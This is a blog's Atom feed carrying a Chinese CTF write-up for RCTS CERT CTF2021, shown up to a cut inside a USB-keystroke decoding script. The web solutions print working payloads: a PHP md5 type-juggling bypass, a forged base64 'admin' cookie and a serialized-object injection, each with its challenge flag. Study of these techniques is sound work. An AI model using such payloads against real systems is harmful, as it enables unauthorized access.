<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>At的小站</title>
  
  
  <link href="http://atkx.top/atom.xml" rel="self"/>
  
  <link href="http://atkx.top/"/>
  <updated>2021-08-15T03:59:06.488Z</updated>
  <id>http://atkx.top/</id>
  
  <author>
    <name>Atkx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCTS CERT CTF2021</title>
    <link href="http://atkx.top/2021/08/13/RCTS-CERT-CTF2021/"/>
    <id>http://atkx.top/2021/08/13/RCTS-CERT-CTF2021/</id>
    <published>2021-08-13T07:44:29.000Z</published>
    <updated>2021-08-15T03:59:06.488Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Some-type-of-juggling"><a href="#Some-type-of-juggling" class="headerlink" title="Some type of juggling"></a>Some type of juggling</h2><p><strong>#web#php</strong><br>Can you solve this challenge?<br>URL:<a href="http://challenges.defsoc.tk:8080/">http://challenges.defsoc.tk:8080</a><br>Flag format: flag{string}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>        highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;240610708&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>] === <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;It is not THAT easy!&#x27;</span>);<br>            &#125; <br>            <span class="hljs-variable">$hash</span> = md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>]);<br>            <span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$value</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hash</span> == <span class="hljs-variable">$key</span>) &#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Congratulations! Your flag is: <span class="hljs-subst">$flag</span>&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Flag not found!&quot;</span>;<br>            &#125;<br>        &#125; <br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>md5后的结果要一样，可以用0e绕过，而且hash与value之间的关系是弱等，所以hash不能是数字。var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));<br> 解题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?hash=QNKCDZO<br>Congratulations! Your flag is: flag&#123;php_typ3_juggl1ng_1s_c00l&#125;<br></code></pre></td></tr></table></figure><h2 id="Exclusive-access"><a href="#Exclusive-access" class="headerlink" title="Exclusive access"></a>Exclusive access</h2><p><strong>#web#owasp10</strong><br>We discovered a protected page. Can you bypass it?<br>URL:<a href="http://challenges.defsoc.tk:9999/">http://challenges.defsoc.tk:9999</a><br>Flag format: flag{string}</p><p> 抓包得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Cookie: user_type=Z3Vlc3Q%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>url解码再base64解码得到guest，将admin逆操作得到YWRtaW4%3D，传过去得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;br0k3n_auth3nt1c4t10n&#125;<br></code></pre></td></tr></table></figure><h2 id="It-is-Magic-after-all"><a href="#It-is-Magic-after-all" class="headerlink" title="It is Magic after all"></a>It is Magic after all</h2><p><strong>#web#php</strong><br>Can you do some magic in this page?<br>URL:<a href="http://challenges.defsoc.tk:3000/">http://challenges.defsoc.tk:3000</a><br>Flag format: flag{string}<br>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Magic</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMagic</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;key === <span class="hljs-literal">true</span>) &#123;<br>          <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nothing...&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magic&#x27;</span>])) &#123;  <br>    <span class="hljs-variable">$magic</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magic&#x27;</span>]); <br>    <span class="hljs-variable">$magic</span>-&gt;doMagic();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Nothing...&quot;</span>;<br>&#125;  <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Magic</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Magic();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?magic=O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Magic&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<br><span class="hljs-comment">#flag&#123;php_d3s3r14l1z4t10n_3xpl01ts&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Hiding-in-plain-sight"><a href="#Hiding-in-plain-sight" class="headerlink" title="Hiding in plain sight"></a>Hiding in plain sight</h2><p><strong>#forensi#images</strong><br>I think there is something fishy about this image.<br>Can you help me out?<br>Flag format: flag{string}<br>​</p><p>010文件尾就是flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;h1dd3n_t3xt_1n_pl41ns1ght&#125;<br></code></pre></td></tr></table></figure><h2 id="Welcome-to-the-challenge"><a href="#Welcome-to-the-challenge" class="headerlink" title="Welcome to the challenge"></a>Welcome to the challenge</h2><p><strong>#forensics#images</strong><br>Welcome to the RCTS Challenge!<br>Can you find the flag?<br>Flag format: flag{string}<br>​</p><p>直接foremost分离图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;<span class="hljs-number">0</span>n3_1m4g3_1s_n0t_3n0ugh&#125;<br></code></pre></td></tr></table></figure><h2 id="About-us"><a href="#About-us" class="headerlink" title="About us"></a>About us</h2><p><strong>#forensics#pdfs</strong><br>This challenge is about the RCTS CERT at FCCN.<br>Can you get the flag?<br>Flag format: flag{string}<br>​</p><p>strings查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ strings RCTSCERT-FCCN.pdf |grep flag                                                                                                      139 ⨯<br>  &lt;pdfx:Flag&gt;flag&#123;4b0ut_us_4t_rcts_c3rt&#125;&lt;/pdfx:Flag&gt;<br></code></pre></td></tr></table></figure><h2 id="Keyp-it-universal"><a href="#Keyp-it-universal" class="headerlink" title="Keyp it universal"></a>Keyp it universal</h2><p><strong>#foren#pcap</strong><br>We intercepted a strange communication which we believe has important information inside.<br>Can you retrieve the information from it?<br>Flag format: flag{string}<br>Regex: flag{[0-9a-z_]+}<br>​</p><p>USB键盘流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">tshark -r capture.pcap -T fields -e usb.capdata &gt; usbdata.txt<br><br>tshark -r capture.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>加冒号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,len(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != len(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br><br></code></pre></td></tr></table></figure><p>keyborad.py</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line in keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span 